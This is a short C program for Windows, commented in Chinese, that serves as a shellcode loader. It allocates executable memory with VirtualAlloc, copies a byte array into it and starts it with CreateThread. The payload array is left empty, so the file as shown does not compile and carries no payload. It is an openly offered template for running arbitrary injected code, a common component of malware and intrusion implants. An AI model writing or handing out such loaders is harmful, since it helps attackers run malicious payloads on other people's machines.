#include <stdio.h>
#include <windows.h>

unsigned char shellcode[] = ;

int main(void) {
    // 分配内存
    void* shellcodeMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeMemory) {
        printf("VirtualAlloc failed.\n");
        return 1;
    }

        // 将shellcode拷贝到分配的内存中
    RtlMoveMemory(shellcodeMemory, shellcode, sizeof(shellcode));

    // 创建线程以运行shellcode
    HANDLE threadHandle = CreateThread(
        NULL,                    // 默认安全属性
        0,                       // 默认堆栈大小
        (LPTHREAD_START_ROUTINE)shellcodeMemory, // 线程开始地址
        NULL,                    // 线程函数参数
        0,                       // 立即运行线程
        NULL                     // 线程ID（不需要）
    );

    if (!threadHandle) {
        printf("CreateThread failed.\n");
        VirtualFree(shellcodeMemory, 0, MEM_RELEASE);
        return 1;
    }

    // 等待线程完成，也可以创建分离线程
    WaitForSingleObject(threadHandle, INFINITE);

    // 清理
    CloseHandle(threadHandle);
    VirtualFree(shellcodeMemory, 0, MEM_RELEASE);

    return 0;
}
